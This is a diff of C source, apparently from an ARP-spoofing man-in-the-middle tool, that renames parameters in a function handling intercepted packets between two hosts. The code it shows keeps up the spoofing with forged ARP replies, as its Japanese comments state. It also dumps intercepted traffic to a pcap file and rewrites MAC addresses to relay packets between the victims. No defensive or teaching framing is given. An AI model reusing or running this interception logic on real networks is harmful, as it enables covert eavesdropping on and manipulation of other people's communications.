@@ -31,7 +31,7 @@
 #include   "pcap_dump.h"
 
 //MITMパケットを検出し、IPアドレスとMACアドレスを書き換えとく
-int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_char send_mac[6],in_addr_t rec_ip,u_char rec_mac[6]){
+int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t tag_a_ip,u_char tag_a_mac[6],in_addr_t tag_b_ip,u_char tag_b_mac[6]){
     u_char    *ptr;
     int    lest;
     struct ether_header    *eh;
@@ -81,8 +81,8 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
         }
 
         //送信者かつ受信者のIPv4アドレスをチェック
-        int isAtoB = *(in_addr_t *)arp->arp_spa == send_ip && *(in_addr_t *)arp->arp_tpa == rec_ip;
-        int isBtoA = *(in_addr_t *)arp->arp_spa == rec_ip && *(in_addr_t *)arp->arp_tpa == send_ip;
+        int isAtoB = *(in_addr_t *)arp->arp_spa == tag_a_ip && *(in_addr_t *)arp->arp_tpa == tag_b_ip;
+        int isBtoA = *(in_addr_t *)arp->arp_spa == tag_b_ip && *(in_addr_t *)arp->arp_tpa == tag_a_ip;
         if(isAtoB || isBtoA){
             DebugPrintf("[%d]recv:MITM ARP PACKET:%dbytes\n",deviceNo,size);
             //AとBの間のARPパケットなので、仲介はせず、スプーフィング継続のための偽のARPリプライを送る
@@ -107,8 +107,8 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
         tempR.s_addr = iphdr->daddr;
         DebugPrintf("IP PACKET: %s to %s\n",inet_ntoa(tempS), inet_ntoa(tempR));
 
-        int isAtoB = (iphdr->saddr == send_ip && iphdr->daddr == rec_ip);
-        int isBtoA = (iphdr->saddr == rec_ip && iphdr->daddr == send_ip);
+        int isAtoB = (iphdr->saddr == tag_a_ip && iphdr->daddr == tag_b_ip);
+        int isBtoA = (iphdr->saddr == tag_b_ip && iphdr->daddr == tag_a_ip);
         //AからBへの通信のときは、IPアドレスとMACアドレスを入れ替えとく。
         if(isAtoB || isBtoA){
             pcap_write(data, size);
@@ -117,9 +117,9 @@ int proccessMITMPacket(int deviceNo,u_char *data,int size, in_addr_t send_ip,u_c
             int ii=0;
             //宛先は、AtoBならBに、BtoAならAのMACアドレスにする
             if(isAtoB){
-                for(ii=0; ii<6; ii++) eh->ether_dhost[ii] = rec_mac[ii];
+                for(ii=0; ii<6; ii++) eh->ether_dhost[ii] = tag_b_mac[ii];
             }else{
-                for(ii=0; ii<6; ii++) eh->ether_dhost[ii] = send_mac[ii];
+                for(ii=0; ii<6; ii++) eh->ether_dhost[ii] = tag_a_mac[ii];
             }
             //送信元MACアドレスは自分
             for(ii=0; ii<6; ii++) eh->ether_shost[ii] = Device[deviceNo].hwaddr[ii];
